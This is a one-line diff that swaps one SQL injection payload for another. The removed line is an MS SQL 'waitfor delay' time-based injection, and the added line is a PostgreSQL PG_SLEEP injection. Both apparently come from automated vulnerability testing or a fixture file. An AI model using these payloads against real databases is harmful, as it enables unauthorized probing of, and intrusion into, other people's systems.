@@ -1,1 +1,1 @@
-555mFSthLSI'; waitfor delay '0:0:15' -- 
+555-1 OR 565=(SELECT 565 FROM PG_SLEEP(15))--
